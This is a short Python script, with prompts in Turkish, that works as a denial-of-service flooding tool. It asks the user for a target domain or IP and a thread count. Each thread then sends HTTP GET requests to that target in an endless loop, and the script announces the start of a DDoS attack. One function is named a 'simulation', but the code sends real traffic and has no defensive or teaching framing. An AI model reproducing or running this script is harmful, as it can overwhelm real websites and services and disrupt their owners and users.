import requests
import time
import threading

def send_request(target_url):
    while True:
        try:
            response = requests.get(target_url)
            print(f"İstek gönderildi, Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Bağlantı hatası: {e}")
        time.sleep(0.1)

def start_ddos():
    target_url = input("Hedef domain veya IP girin: ")
    threads_count = int(input("Kaç paralel thread kullanılsın? (Önerilen: 100): "))
    print(f"DDoS saldırısı başlatılıyor, {threads_count} thread kullanılacak...")

    threads = []
    for i in range(threads_count):
        t = threading.Thread(target=send_request, args=(target_url,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

def run_ddos_simulation():
    start_ddos()
